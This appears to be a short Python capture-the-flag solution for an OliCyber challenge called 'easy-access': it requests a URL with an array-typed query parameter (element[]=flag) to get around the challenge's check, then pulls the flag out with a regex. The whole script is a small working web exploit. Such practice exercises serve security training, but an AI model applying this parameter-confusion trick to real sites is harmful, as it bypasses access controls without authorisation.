import requests
import re

URL = "http://easy-access.challs.olicyber.it/element?element[]=flag"

r = requests.get(URL)

match = re.search(r"flag\{[^\}]+\}", r.text, re.IGNORECASE)
if match:
    print(match.group(0))